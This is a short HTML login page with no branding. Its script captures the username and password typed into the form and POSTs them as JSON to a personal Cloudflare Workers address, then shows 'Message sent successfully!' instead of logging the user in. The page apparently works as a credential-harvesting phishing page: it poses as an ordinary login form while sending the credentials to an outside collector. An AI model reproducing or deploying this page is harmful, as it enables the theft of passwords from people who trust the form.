<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <h2>Login Form</h2>
    <form id="loginForm">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Login</button>
    </form>

    <p id="status" style="color: green; display: none;">Message sent successfully!</p>
    <p id="error" style="color: red; display: none;">Failed to send the message. Please try again.</p>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const formData = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value
            };
            
            try {
                const response = await fetch('https://long-brook-3609.henrycrane65.workers.dev/', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });

                if (response.ok) {
                    document.getElementById('status').style.display = 'block';
                    document.getElementById('error').style.display = 'none';
                } else {
                    document.getElementById('error').style.display = 'block';
                    document.getElementById('status').style.display = 'none';
                }
            } catch (error) {
                document.getElementById('error').style.display = 'block';
                document.getElementById('status').style.display = 'none';
                console.error('An error occurred:', error.message);
            }
        });
    </script>
</body>
</html>
